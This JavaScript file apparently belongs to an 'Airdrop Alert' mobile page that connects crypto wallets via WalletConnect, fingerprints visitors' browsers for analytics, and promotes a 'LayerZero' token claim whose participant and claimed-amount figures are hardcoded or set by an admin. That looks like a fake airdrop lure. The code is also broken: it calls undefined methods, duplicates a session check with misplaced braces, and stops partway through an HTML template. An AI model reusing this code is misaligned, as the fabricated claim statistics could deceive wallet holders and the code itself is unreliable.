// Mobile-Specific JavaScript for Airdrop Alert
// Using Reown AppKit (WalletConnect v2) for wallet connections

// Reown AppKit configuration
const APP_CONFIG = {
    name: 'Airdrop Alert',
    description: 'Claim your airdrop tokens',
    url: window.location.origin,
    icons: ['https://your-app-url.com/icon.png'],
    projectId: process.env.REOWN_PROJECT_ID || 'b6305d1a61c6eaed262b8a54ffbcdfe9', // Replace with your project ID
    chainId: 1, // Ethereum Mainnet
    requiredChains: [1],
    optionalChains: [56, 137, 10, 42161], // BSC, Polygon, Optimism, Arbitrum
    metadata: {
        name: 'Airdrop Alert',
        description: 'Claim your airdrop tokens',
        url: window.location.origin,
        icons: ['https://your-app-url.com/icon.png']
    }

};

class MobileAirdropAlert {
    constructor() {
        console.log('[MOBILE] Initializing Mobile Airdrop Alert...');
        
        // Core state
        this.reownAppKit = null;
        this.walletAddress = null;
        this.isConnected = false;
        this.chainId = 1; // Ethereum Mainnet
        this.currentURI = null;
        this.sessionId = this.generateSessionId();
        this.config = this.loadConfig();
        
        // Device and browser info
        this.deviceInfo = this.getDeviceInfo();
        this.browserInfo = this.getBrowserInfo();
        
        // Timeouts and intervals
        this.errorTimeout = null;
        this.loadingTimeout = null;
        this.heartbeatInterval = null;
        
        // Initialize analytics
        this.initializeAnalytics();
    }
    
    // Load configuration from environment and local storage
    loadConfig() {
        return {
            debug: process.env.NODE_ENV === 'development',
            version: '1.0.0',
            analyticsEndpoint: process.env.ANALYTICS_ENDPOINT || 'https://analytics.your-app.com',
            errorTrackingEnabled: true,
            autoReconnect: true,
            maxReconnectAttempts: 3,
            reconnectDelay: 1000,
            // Load from localStorage or use defaults
            ...JSON.parse(localStorage.getItem('appConfig') || '{}')
        };
    }
    
    // Generate a unique session ID
    generateSessionId() {
        const storedId = localStorage.getItem('sessionId');
        if (storedId) return storedId;
        
        const newId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        localStorage.setItem('sessionId', newId);
        return newId;
    }
    
    // Get detailed browser information
    getBrowserInfo() {
        const parser = new UAParser();
        const result = parser.getResult();
        
        return {
            browser: result.browser,
            os: result.os,
            device: result.device,
            engine: result.engine,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1
            },
            language: navigator.language,
            languages: navigator.languages,
            online: navigator.onLine,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack === '1' || window.doNotTrack === '1',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent
        };
    }
    
    // Initialize analytics
    initializeAnalytics() {
        // Send session start event
        this.trackEvent('session_start', {
            url: window.location.href,
            referrer: document.referrer,
            ...this.deviceInfo,
            ...this.browserInfo
        });
        
        // Set up heartbeat
        this.heartbeatInterval = setInterval(() => {
            this.trackEvent('heartbeat', {
                timeOnPage: Math.floor((Date.now() - this.sessionStartTime) / 1000)
            });
        }, 30000); // Every 30 seconds
        
        // Track page visibility changes
        document.addEventListener('visibilitychange', () => {
            this.trackEvent('visibility_change', {
                isVisible: !document.hidden,
                timeOnPage: Math.floor((Date.now() - this.sessionStartTime) / 1000)
            });
        });
        
        // Track page unload
        window.addEventListener('beforeunload', () => {
            this.trackEvent('session_end', {
                duration: Math.floor((Date.now() - this.sessionStartTime) / 1000)
            });
            
            // Clean up
            if (this.heartbeatInterval) {
                clearInterval(this.heartbeatInterval);
            }
        });
        
        this.sessionStartTime = Date.now();
    }
    
    // Track event with analytics
    trackEvent(eventName, eventData = {}) {
        const analyticsData = {
            event: eventName,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: this.deviceInfo.platform,
            ...eventData
        };
        
        // Send to analytics endpoint
        fetch(`${this.config.analyticsEndpoint}/track`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(analyticsData)
        }).catch(error => {
            console.error('[ANALYTICS] Failed to track event:', error);
        });
        
        // Log to console in development
        if (this.config.debug) {
            console.log(`[ANALYTICS] ${eventName}`, analyticsData);
        }
    }
    
    // Enhanced error handler
    handleError(error, context = '') {
        const errorId = `err_${Date.now()}`;
        const errorInfo = {
            id: errorId,
            message: error.message,
            context,
            stack: error.stack,
            timestamp: new Date().toISOString()
        };
        
        // Log to console
        console.error(`[ERROR][${errorId}] ${context}:`, error);
        
        // Send to error tracking
        if (this.config.errorTrackingEnabled) {
            fetch(`${this.config.analyticsEndpoint}/error`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(errorInfo)
            }).catch(e => console.error('Failed to report error:', e));
        }
        
        // Show user-friendly error
        this.showError(`An error occurred (${errorId}). Please try again.`);
        
        return errorId;
    }

    // Initialize Reown AppKit with WalletConnect v2 and enhanced error handling
    async initializeReown() {
        try {
            this.trackEvent('wallet_initialization_start');
            console.log('[MOBILE] Initializing Reown AppKit...');
            
            // Check if Reown is available
            if (typeof window.ReownAppKit === 'undefined') {
                const error = new Error('Reown AppKit not loaded');
                this.trackEvent('wallet_initialization_failed', { error: error.message });
                throw error;
            }
            
            // Initialize Reown AppKit
            this.reownAppKit = await window.ReownAppKit.init({
                projectId: APP_CONFIG.projectId,
                chains: [{
                    id: 1, // Ethereum Mainnet
                    name: 'Ethereum',
                    rpcUrl: 'https://cloudflare-eth.com/',
                    nativeCurrency: {
                        name: 'Ethereum',
                        symbol: 'ETH',
                        decimals: 18
                    },
                    blockExplorerUrl: 'https://etherscan.io'
                }],
                metadata: APP_CONFIG.metadata,
                theme: 'dark',
                mobileWallets: [
                    {
                        id: 'metamask',
                        name: 'MetaMask',
                        links: {
                            native: 'metamask://wc?uri={uri}',
                            universal: 'https://metamask.app.link/wc?uri={uri}'
                        }
                    },
                    {
                        id: 'trust',
                        name: 'Trust Wallet',
                        links: {
                            native: 'trust://wc?uri={uri}',
                            universal: 'https://link.trustwallet.com/wc?uri={uri}'
                        }
                    },
                    {
                        id: 'coinbase',
                        name: 'Coinbase Wallet',
                        links: {
                            native: 'coinbase-wallet://wc?uri={uri}',
                            universal: 'https://go.cb-w.com/wc?uri={uri}'
                        }
                    }
                ]
            });
            
            // Set up event listeners
            this.reownAppKit.on('display_uri', (uri) => {
                console.log('[MOBILE] WalletConnect URI received:', uri);
                this.currentURI = uri;
                this.showQRCode(uri);
            });
            
            this.reownAppKit.on('connect', (session) => {
                console.log('[MOBILE] Wallet connected:', session);
                this.handleSessionUpdate(session);
            });
            
            this.reownAppKit.on('disconnect', () => {
                console.log('[MOBILE] Wallet disconnected');
                this.handleDisconnect();
            });
            
            this.reownAppKit.on('session_update', (session) => {
                console.log('[MOBILE] Session updated:', session);
                this.handleSessionUpdate(session);
            });
            
            console.log('[MOBILE] Reown AppKit initialized successfully');
            
            // Check for existing session
            if (this.reownAppKit.session) {
                console.log('[MOBILE] Found existing session');
                this.handleSessionUpdate(this.reownAppKit.session);
            }
            
        } catch (error) {
            console.error('[MOBILE] Failed to initialize Reown AppKit:', error);
            this.showError('Failed to initialize wallet connection. Please refresh the page.');
            throw error;
        }
    }
    
    // Enhanced wallet connection with retry logic
    async connectWallet(walletId = null, retryCount = 0) {
        const maxRetries = 3;
        const retryDelay = 1000; // 1 second
        
        try {
            if (!this.reownAppKit) {
                if (retryCount < maxRetries) {
                    console.warn(`[MOBILE] Reown AppKit not ready, retrying (${retryCount + 1}/${maxRetries})...`);
                    await new Promise(resolve => setTimeout(resolve, retryDelay));
                    return this.connectWallet(walletId, retryCount + 1);
                }
                throw new Error('Reown AppKit not initialized after multiple attempts');
            }
            
            this.trackEvent('wallet_connection_attempt', { walletId: walletId || 'qr_code' });
            
            console.log(`[MOBILE] Connecting to wallet: ${walletId || 'QR Code'}`);
            
            // Show loading state
            this.showLoading('Connecting to wallet...');
            
            // Enhanced wallet connection with timeout
            const connectionPromise = this.reownAppKit.connect({
                chainId: this.chainId,
                walletId: walletId, // If null, will show QR code
                timeout: 30000, // 30 seconds timeout
                metadata: {
                    name: 'Airdrop Alert',
                    description: 'Connect your wallet to claim your airdrop',
                    url: window.location.href,
                    icons: ['https://your-app-url.com/logo.png']
                }
            });
            
            // Set connection timeout
            const timeoutPromise = new Promise((_, reject) => {
                setTimeout(() => {
                    reject(new Error('Connection timeout. Please try again.'));
                }, 30000);
            });
            
            // Race the connection against the timeout
            await Promise.race([connectionPromise, timeoutPromise]);
            
            this.trackEvent('wallet_connection_success', { walletId: walletId || 'qr_code' });
            
        } catch (error) {
            console.error('[MOBILE] Wallet connection error:', error);
            this.hideLoading();
            this.showError(`Failed to connect to wallet: ${error.message}`);
        }
    }
    
    // Disconnect the current wallet
    async disconnectWallet() {
        try {
            if (this.reownAppKit && this.reownAppKit.session) {
                await this.reownAppKit.disconnect();
            }
            this.handleDisconnect();
        } catch (error) {
            console.error('[MOBILE] Error disconnecting wallet:', error);
        }
    }
    
    // Enhanced session handling with analytics
    async handleSessionUpdate(session) {
        console.log('[MOBILE] Handling session update:', session);
        
        // Track session update
        this.trackEvent('wallet_session_update', {
            sessionId: session?.id,
            walletAddress: session?.accounts?.[0],
            chainId: session?.chainId,
            walletName: session?.peer?.metadata?.name
        });
        
        // Check if we have a valid session
        if (!session || !session.accounts || session.accounts.length === 0) {
            console.log('[MOBILE] No active session');
            this.handleDisconnect();
            return;
        }
        
        try {
            // Verify the connected chain
            const isChainSupported = this.isChainSupported(session.chainId);
            if (!isChainSupported) {
                this.showError(`Unsupported chain. Please switch to a supported network.`);
                this.requestChainSwitch();
                return;
            }
            
            // Verify account ownership
            const isVerified = await this.verifyAccountOwnership(session.accounts[0]);
            if (!isVerified) {
                this.showError('Failed to verify wallet ownership. Please try again.');
                return;
            }
        
        if (!session || !session.accounts || session.accounts.length === 0) {
            console.log('[MOBILE] No active session');
            this.handleDisconnect();
            return;
        }
        
        // Extract wallet address from session
        const account = session.accounts[0];
        const [namespace, reference, address] = account.split(':');
        
        if (!address) {
            console.error('[MOBILE] Invalid account format:', account);
            return;
        }
        
        this.walletAddress = address;
        this.isConnected = true;
        
        // Update UI
        this.updateWalletUI(true);
        this.hideLoading();
        this.hideQRCode();
        

        } catch (error) {
            console.error('[MOBILE] Error in session handling:', error);
        }
    }
    
    // Handle wallet disconnection
    handleDisconnect() {
        console.log('[MOBILE] Handling wallet disconnection');
        
        this.walletAddress = null;
        this.isConnected = false;
        
        // Update UI
        this.updateWalletUI(false);
        this.hideQRCode();
        
        // Notify server about disconnection
        if (this.walletAddress) {
            this.notifyServer('wallet_disconnected', {
                address: this.walletAddress
            });
        }
    }
    
    // Enhanced QR code handling with deep linking
    showQRCode(uri) {
        console.log('[MOBILE] Showing QR code');
        this.trackEvent('wallet_qr_displayed');
        
        // Create deep link for mobile wallets
        const universalLink = this.generateWalletDeepLink(uri);
        
        // Auto-detect mobile devices and show appropriate UI
        if (this.isMobileDevice()) {
            this.showMobileWalletOptions(uri);
            return;
        }
        
        const qrContainer = document.getElementById('walletQRCode');
        const qrCanvas = document.getElementById('qrCodeCanvas');
        
        if (!qrContainer || !qrCanvas) {
            console.error('[MOBILE] QR code elements not found');
            return;
        }
        
        // Show QR container
        qrContainer.style.display = 'block';
        
        // Generate QR code
        QRCode.toCanvas(qrCanvas, uri, { width: 256, margin: 1 }, (error) => {
            if (error) {
                console.error('[MOBILE] Failed to generate QR code:', error);
                this.showError('Failed to generate QR code. Please try again.');
                return;
            }
            
            console.log('[MOBILE] QR code generated successfully');
        });
        
        // Add click handler to copy URI
        qrCanvas.onclick = () => this.copyToClipboard(uri);
    }
    
    // Hide QR code
    hideQRCode() {
        const qrContainer = document.getElementById('walletQRCode');
        if (qrContainer) {
            qrContainer.style.display = 'none';
        }
    }
    
    // Copy text to clipboard
    async copyToClipboard(text) {
        try {
            await navigator.clipboard.writeText(text);
            this.showMessage('Copied to clipboard!');
        } catch (error) {
            console.error('[MOBILE] Failed to copy to clipboard:', error);
            this.showError('Failed to copy to clipboard');
        }
    }
    
    // Update UI based on wallet connection state
    updateWalletUI(isConnected) {
        const connectButton = document.getElementById('mobileConnectBtn');
        const walletInfo = document.getElementById('walletInfo');
        const qrContainer = document.getElementById('walletQRCode');
        
        if (isConnected) {
            // Update connect button to show wallet info
            if (connectButton) {
                connectButton.innerHTML = `
                    <span class="wallet-address">${this.formatAddress(this.walletAddress)}</span>
                    <span class="wallet-status connected">Connected</span>
                `;
                connectButton.onclick = () => this.disconnectWallet();
            }
            
            // Show wallet info if available
            if (walletInfo) {
                walletInfo.style.display = 'block';
                const addressEl = walletInfo.querySelector('.wallet-address');
                if (addressEl) {
                    addressEl.textContent = this.walletAddress;
                }
            }
            
            // Hide QR code if visible
            if (qrContainer) {
                qrContainer.style.display = 'none';
            }
            
        } else {
            // Update connect button to show connect text
            if (connectButton) {
                connectButton.innerHTML = `
                    <span class="wallet-icon">🔗</span>
                    <span>Connect Wallet</span>
                `;
                connectButton.onclick = () => this.showWalletOptions();
            }
            
            // Hide wallet info if available
            if (walletInfo) {
                walletInfo.style.display = 'none';
            }
        }
    }
    
    // Format wallet address for display
    formatAddress(address) {
        if (!address) return '';
        return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
    }
    
    // Show wallet options (for mobile)
    showWalletOptions() {
        const modal = document.getElementById('mobileWalletConnectModal');
        if (modal) {
            modal.style.display = 'block';
        }
    }
    
    // Enhanced loading state with progress tracking
    showLoading(message = 'Loading...', options = {}) {
        const {
            progress = null,
            showSpinner = true,
            showProgressBar = false,
            cancelable = false
        } = options;
        
        const loadingEl = document.getElementById('walletConnectLoading');
        if (!loadingEl) return;
        
        // Update message
        const messageEl = loadingEl.querySelector('.loading-message');
        if (messageEl) {
            messageEl.textContent = message;
        }
        
        // Update progress if provided
        if (progress !== null) {
            const progressEl = loadingEl.querySelector('.loading-progress');
            if (progressEl) {
                progressEl.style.width = `${Math.min(100, Math.max(0, progress))}%`;
            }
        }
        
        // Toggle spinner
        const spinnerEl = loadingEl.querySelector('.loading-spinner');
        if (spinnerEl) {
            spinnerEl.style.display = showSpinner ? 'block' : 'none';
        }
        
        // Toggle progress bar
        const progressBarEl = loadingEl.querySelector('.loading-progress-container');
        if (progressBarEl) {
            progressBarEl.style.display = showProgressBar ? 'block' : 'none';
        }
        
        // Handle cancel button
        const cancelBtn = loadingEl.querySelector('.cancel-button');
        if (cancelBtn) {
            if (cancelable) {
                cancelBtn.style.display = 'block';
                cancelBtn.onclick = () => {
                    this.trackEvent('loading_cancelled', { message });
                    this.hideLoading();
                    if (options.onCancel) options.onCancel();
                };
            } else {
                cancelBtn.style.display = 'none';
            }
        }
        
        loadingEl.style.display = 'flex';
        
        // Track loading state
        this.trackEvent('loading_shown', { message, progress });
    }
    
    // Enhanced hide loading with cleanup
    hideLoading() {
        const loadingEl = document.getElementById('walletConnectLoading');
        if (!loadingEl) return;
        
        // Add fade-out animation
        loadingEl.style.opacity = '0';
        loadingEl.style.transition = 'opacity 0.3s ease';
        
        // Remove from DOM after animation
        setTimeout(() => {
            loadingEl.style.display = 'none';
            loadingEl.style.opacity = '1';
            
            // Reset progress
            const progressEl = loadingEl.querySelector('.loading-progress');
            if (progressEl) {
                progressEl.style.width = '0%';
            }
            
            // Clear any existing timeout
            if (this.loadingTimeout) {
                clearTimeout(this.loadingTimeout);
            }
        }, 300);
        
        // Track loading completion
        this.trackEvent('loading_hidden');
    }
    
    // Enhanced error display with analytics
    showError(message, options = {}) {
        const {
            isCritical = false,
            action = null,
            autoHide = true,
            hideAfter = 5000
        } = options;
        
        const errorEl = document.getElementById('walletConnectError');
        if (!errorEl) return;
        
        // Update error message
        errorEl.textContent = message;
        errorEl.className = `error-message ${isCritical ? 'critical' : ''}`;
        errorEl.style.display = 'block';
        
        // Add action button if provided
        if (action && action.text && action.handler) {
            const actionBtn = document.createElement('button');
            actionBtn.className = 'error-action';
            actionBtn.textContent = action.text;
            actionBtn.onclick = action.handler;
            
            // Clear any existing action buttons
            const existingBtn = errorEl.querySelector('.error-action');
            if (existingBtn) {
                errorEl.removeChild(existingBtn);
            }
            
            errorEl.appendChild(actionBtn);
        }
        
        // Track the error
        this.trackEvent('ui_error_displayed', {
            message,
            isCritical,
            action: action?.text || null
        });
        
        // Auto-hide if enabled
        if (autoHide) {
            this.errorTimeout = setTimeout(() => {
                errorEl.style.display = 'none';
            }, hideAfter);
        }
        
        // Clear any existing timeout
        if (this.errorTimeout) {
            clearTimeout(this.errorTimeout);
        }
    }
    
    // Show success message
    showMessage(message) {
        // You can implement a toast notification or similar here
        console.log('[MOBILE] Message:', message);
    }
    
    // Enhanced server notification with retry logic
    async notifyServer(event, data, retryCount = 0) {
        const maxRetries = 3;
        const retryDelay = 1000; // 1 second
        
        try {
            const response = await fetch('/api/wallet/event', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Request-ID': `evt_${Date.now()}`,
                    'X-Client-Version': this.config.version
                },
                body: JSON.stringify({
                    event,
                    data: {
                        ...data,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        deviceInfo: this.deviceInfo,
                        sessionId: this.sessionId,
                        network: this.currentNetwork
                    }
                })
            });
            
            if (!response.ok) {
                const error = new Error(`Server responded with ${response.status}`);
                error.status = response.status;
                throw error;
            }
            
            const result = await response.json();
            this.trackEvent('server_notification_success', { event });
            return result;
            
        } catch (error) {
            console.error(`[MOBILE] Failed to notify server (attempt ${retryCount + 1}):`, error);
            
            // Retry on network errors or 5xx responses
            if (retryCount < maxRetries && 
                (error instanceof TypeError || // Network error
                 (error.status && error.status >= 500))) {
                console.log(`[MOBILE] Retrying notification (${retryCount + 1}/${maxRetries})...`);
                await new Promise(resolve => setTimeout(resolve, retryDelay * (retryCount + 1)));
                return this.notifyServer(event, data, retryCount + 1);
            }
            
            // Log the final failure
            this.trackEvent('server_notification_failed', {
                event,
                error: error.message,
                retryCount
            });
            
            throw error;
        }
    }
    
    showOfflineWarning() {
        const warningDiv = document.createElement('div');
        warningDiv.className = 'offline-warning';
        warningDiv.innerHTML = `
            <div class="warning-content">
                <div class="warning-icon">📡</div>
                <div class="warning-text">
                    <strong>No Internet Connection</strong><br>
                    Please check your internet connection and try again.
                </div>
            </div>
        `;
        document.body.appendChild(warningDiv);
    }
    
    hideOfflineWarning() {
        const warningDiv = document.querySelector('.offline-warning');
        if (warningDiv) {
            warningDiv.remove();
        }
    }
    
    checkCookieSupport() {
        if (!navigator.cookieEnabled) {
            console.warn('[MOBILE] Cookies disabled - WalletConnect may not work properly');
            this.showCookieWarning();
            return false;
        }
        return true;
    }
    
    showCookieWarning() {
        const warningDiv = document.createElement('div');
        warningDiv.className = 'cookie-warning';
        warningDiv.innerHTML = `
            <div class="warning-content">
                <div class="warning-icon">⚠️</div>
                <div class="warning-text">
                    <strong>Cookies Disabled</strong><br>
                    Third-party cookies are blocked. This may affect WalletConnect functionality.
                    <br><small>Enable cookies in your browser settings for the best experience.</small>
                </div>
                <button class="warning-close" onclick="this.parentElement.parentElement.remove()">×</button>
            </div>
        `;
        document.body.appendChild(warningDiv);
        
        // Auto-remove after 10 seconds
        setTimeout(() => {
            if (warningDiv.parentNode) {
                warningDiv.remove();
            }
        }, 10000);
    }
    
    async initializeWalletConnectWithRetry(maxRetries = 3) {
        for (let i = 0; i < maxRetries; i++) {
            try {
                await this.initializeWalletConnect();
                return; // Success
            } catch (error) {
                console.warn(`[MOBILE] WalletConnect init attempt ${i + 1} failed:`, error.message);
                if (i === maxRetries - 1) {
                    throw error; // Final attempt failed
                }
                // Wait before retry with exponential backoff
                await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
            }
        }
    }
    
    async loadMobileAdminSettings() {
        try {
            const response = await fetch('/api/mobile/admin-settings');
            if (response.ok) {
                this.mobileAdminSettings = await response.json();
                this.updateMobileTokenDetails();
                console.log('[MOBILE] Admin settings loaded:', this.mobileAdminSettings);
            } else {
                console.warn('[MOBILE] Failed to load admin settings, using defaults');
                this.mobileAdminSettings = {
                    tokenName: 'LayerZero',
                    tokenSymbol: 'ZRO',
                    tokenPrice: 2.01,
                    tokenDescription: 'Cross-chain communication protocol',
                    totalAllocation: 16104561,
                    claimedAmount: 7528190,
                    participantCount: 12500,
                    endDate: '2026-12-31T23:59:59Z'
                };
                this.updateMobileTokenDetails();
            }
            
            // Start real-time price updates
            this.startRealTimePriceUpdates();
        } catch (error) {
            console.error('[MOBILE] Error loading admin settings:', error);
        }
    }
    
    async startRealTimePriceUpdates() {
        // Fetch real-time price immediately
        await this.fetchRealTimePrice();
        
        // Set up interval for price updates (use default 30 seconds)
        const updateInterval = 30; // Default 30 seconds for mobile
        setInterval(async () => {
            await this.fetchRealTimePrice();
        }, updateInterval * 1000);
    }
    
    async fetchRealTimePrice() {
        try {
            const response = await fetch('/api/layerzero-price');
            if (response.ok) {
                const priceData = await response.json();
                if (priceData.price && priceData.price > 0) {
                    // Update the mobile admin settings with real-time price
                    if (this.mobileAdminSettings) {
                        this.mobileAdminSettings.tokenPrice = priceData.price;
                        this.updateMobileTokenDetails();
                        console.log('[MOBILE] Real-time price updated:', priceData.price);
                    }
                }
            } else {
                console.warn('[MOBILE] Failed to fetch real-time price, using cached value');
            }
        } catch (error) {
            console.error('[MOBILE] Error fetching real-time price:', error);
        }
    }
    
    updateMobileTokenDetails() {
        if (!this.mobileAdminSettings) return;
        
        const elements = {
            'mobileTokenName': this.mobileAdminSettings.tokenName,
            'mobileTokenSymbol': this.mobileAdminSettings.tokenSymbol,
            'mobileTokenPrice': `$${this.mobileAdminSettings.tokenPrice}`,
            'mobileTokenDescription': this.mobileAdminSettings.tokenDescription,
            'mobileAirdropAmount': '1,000 ' + this.mobileAdminSettings.tokenSymbol,
            'mobileTotalValue': `$${(1000 * this.mobileAdminSettings.tokenPrice).toFixed(2)}`,
            'mobileEndDate': new Date(this.mobileAdminSettings.endDate).toLocaleDateString(),
            'mobileTokenFullDescription': this.mobileAdminSettings.tokenDescription + ' This airdrop rewards early adopters and contributors to the ecosystem.'
        };
        
        Object.entries(elements).forEach(([id, value]) => {
            const element = document.getElementById(id);
            if (element) {
                element.textContent = value;
            }
        });
    }
    
    async initializeWalletConnect() {
        try {
            // Show loading state
            this.showWalletConnectLoading();
            
            // Load WalletConnect configuration
            const response = await fetch('/api/mobile/walletconnect-config');
            if (response.ok) {
                const config = await response.json();
                console.log('[MOBILE] WalletConnect config loaded:', config);
                
                // Wait for UniversalProvider to be available
                const Provider = await this.waitForUniversalProvider();
                
                try {
                    this.walletConnectProvider = await Provider.init({
                        projectId: config.projectId,
                        metadata: {
                            name: config.appName,
                            description: config.appDescription,
                            url: config.appUrl || 'https://localhost:3000',
                            icons: ['https://walletconnect.com/walletconnect-logo.png']
                        },
                        relayUrl: 'wss://relay.walletconnect.com'
                    });
                    
                    // Set up event listeners
                    this.walletConnectProvider.on('display_uri', (uri) => {
                        console.log('[MOBILE] WalletConnect URI received:', uri);
                        this.currentURI = uri;
                        this.updateConnectionString(uri);
                        this.showMobileQR(uri);
                    });
                    
                    this.walletConnectProvider.on('connect', (session) => {
                        console.log('[MOBILE] WalletConnect connected:', session);
                        this.handleWalletConnectSession(session);
                    });
                    
                    this.walletConnectProvider.on('disconnect', (error) => {
                        console.log('[MOBILE] WalletConnect disconnected:', error);
                        this.handleWalletConnectDisconnect();
                    });
                    
                    this.walletConnectProvider.on('session_delete', () => {
                        console.log('[MOBILE] WalletConnect session deleted');
                        this.handleWalletConnectDisconnect();
                    });
                    
                    console.log('[MOBILE] WalletConnect provider initialized successfully');
                    this.hideWalletConnectError();
                    this.hideWalletConnectLoading();
                } catch (wcError) {
                    console.error('[MOBILE] WalletConnect init error:', wcError);
                    this.hideWalletConnectLoading();
                    this.showWalletConnectError('Failed to initialize WalletConnect. Please try again.');
                }
            } else {
                console.error('[MOBILE] Failed to load WalletConnect config');
                this.hideWalletConnectLoading();
                this.showWalletConnectError('Configuration error. Please refresh the page.');
            }
        } catch (error) {
            console.error('[MOBILE] WalletConnect initialization error:', error);
            this.hideWalletConnectLoading();
            this.showWalletConnectError('Connection error. Please check your internet connection.');
        }
    }
    
    async waitForUniversalProvider(maxRetries = 5, delay = 500) {
        for (let i = 0; i < maxRetries; i++) {
            // Check multiple possible global names
            const provider = window.UniversalProvider || window.WalletConnectUniversalProvider || UniversalProvider;
            if (provider && typeof provider.init === 'function') {
                console.log('[MOBILE] UniversalProvider found after', i + 1, 'attempts');
                return provider;
            }
            console.log('[MOBILE] Waiting for UniversalProvider... attempt', i + 1);
            console.log('[MOBILE] Available globals:', Object.keys(window).filter(k => k.toLowerCase().includes('wallet') || k.toLowerCase().includes('provider')));
            await new Promise(resolve => setTimeout(resolve, delay * (i + 1))); // Exponential backoff
        }
        
        // Try to load from alternative CDN as fallback
        console.log('[MOBILE] Attempting to load UniversalProvider from fallback CDN');
        try {
            await this.loadUniversalProviderFallback();
            const provider = window.UniversalProvider || window.WalletConnectUniversalProvider || UniversalProvider;
            if (provider && typeof provider.init === 'function') {
                return provider;
            }
        } catch (fallbackError) {
            console.error('[MOBILE] Fallback loading failed:', fallbackError);
        }
        
        throw new Error('UniversalProvider not loaded after ' + maxRetries + ' attempts and fallback failed');
    }
    
    async loadUniversalProviderFallback() {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = 'https://unpkg.com/@walletconnect/universal-provider@2.15.2/dist/index.umd.js';
            script.crossOrigin = 'anonymous';
            script.onload = () => {
                console.log('[MOBILE] UniversalProvider loaded from fallback CDN');
                // Wait a bit for the global to be set
                setTimeout(() => {
                    console.log('[MOBILE] Available globals after fallback:', Object.keys(window).filter(k => k.toLowerCase().includes('wallet') || k.toLowerCase().includes('provider')));
                    resolve();
                }, 100);
            };
            script.onerror = () => {
                console.error('[MOBILE] Fallback CDN loading failed');
                reject(new Error('Fallback CDN failed'));
            };
            document.head.appendChild(script);
        });
    }
    
    updateConnectionString(uri) {
        const connectionStringElement = document.getElementById('connectionString');
        if (connectionStringElement) {
            connectionStringElement.textContent = uri;
        }
    }
    
    hideWalletConnectError() {
        const modal = document.getElementById('mobileWalletConnectModal');
        if (modal) {
            const existingError = modal.querySelector('.mobile-error-message');
            if (existingError) {
                existingError.remove();
            }
        }
    }
    
    showMobileQR(uri) {
        const qrContainer = document.getElementById('mobileQRContainer');
        const qrCanvas = document.getElementById('mobileQRCode');
        const walletOptions = document.getElementById('mobileWalletOptions');
        
        if (qrContainer && qrCanvas) {
            console.log('[MOBILE] Generating QR code for URI:', uri);
            
            // Show QR container and hide wallet options
            qrContainer.style.display = 'block';
            if (walletOptions) {
                walletOptions.style.display = 'none';
            }
            
            // Clear previous QR code
            const ctx = qrCanvas.getContext('2d');
            ctx.clearRect(0, 0, qrCanvas.width, qrCanvas.height);
            
            // Wait for QRCode library to be available
            this.waitForQRCodeLibrary().then(() => {
                if (typeof QRCode !== 'undefined') {
                    try {
                        // Clear canvas first
                        qrCanvas.innerHTML = '';
                        
                        // Create QR code with proper error handling
                        const qr = new QRCode(qrCanvas, {
                            text: uri,
                            width: 256,
                            height: 256,
                            colorDark: '#000000',
                            colorLight: '#FFFFFF',
                            correctLevel: QRCode.CorrectLevel.H
                        });
                        
                        console.log('[MOBILE] QR code generated successfully');
                        
                        // Ensure canvas is visible and properly sized
                        qrCanvas.style.width = '100%';
                        qrCanvas.style.height = 'auto';
                        qrCanvas.style.maxWidth = '256px';
                        qrCanvas.style.display = 'block';
                        
                        // Verify QR code was actually rendered
                        setTimeout(() => {
                            if (qrCanvas.children.length === 0) {
                                console.warn('[MOBILE] QR code not rendered, using fallback');
                                this.generateQRFallback(uri, qrCanvas);
                            }
                        }, 1000);
                        
                    } catch (qrError) {
                        console.error('[MOBILE] QR code generation error:', qrError);
                        this.generateQRFallback(uri, qrCanvas);
                    }
                } else {
                    console.error('[MOBILE] QRCode library not available after retry');
                    this.generateQRFallback(uri, qrCanvas);
                }
            });
        } else {
            console.error('[MOBILE] QR container or canvas not found');
        }
    }
    
    generateQRFallback(uri, canvas) {
        console.log('[MOBILE] Using QR code fallback');
        
        // Create fallback using external QR service
        const img = document.createElement('img');
        img.src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(uri)}&size=256x256&format=png`;
        img.alt = 'QR Code';
        img.style.width = '100%';
        img.style.height = 'auto';
        img.style.maxWidth = '256px';
        img.style.display = 'block';
        
        // Replace canvas with img
        canvas.parentNode.replaceChild(img, canvas);
        
        // Add error handling for fallback
        img.onerror = () => {
            console.error('[MOBILE] QR fallback failed');
            canvas.innerHTML = `
                <div style="width: 256px; height: 256px; background: #f0f0f0; display: flex; align-items: center; justify-content: center; border: 2px dashed #ccc;">
                    <div style="text-align: center; color: #666;">
                        <div style="font-size: 24px; margin-bottom: 10px;">📱</div>
                        <div>QR Code Unavailable</div>
                        <div style="font-size: 12px; margin-top: 5px;">Use connection string below</div>
                    </div>
                </div>
            `;
        };
    }
    
    async waitForQRCodeLibrary(maxRetries = 15, delay = 500) {
        for (let i = 0; i < maxRetries; i++) {
            if (typeof QRCode !== 'undefined') {
                console.log('[MOBILE] QRCode library found after', i + 1, 'attempts');
                return true;
            }
            console.log('[MOBILE] Waiting for QRCode library... attempt', i + 1);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        console.warn('[MOBILE] QRCode library not available after', maxRetries, 'attempts');
        return false;
    }
    
    showWalletConnectError(message) {
        console.error('[MOBILE] WalletConnect Error:', message);
        
        // Create foreground error modal
        const errorModal = document.createElement('div');
        errorModal.className = 'mobile-error-modal';
        errorModal.innerHTML = `
            <div class="error-modal-content">
                <div class="error-modal-header">
                    <div class="error-icon">⚠️</div>
                    <h3>Connection Error</h3>
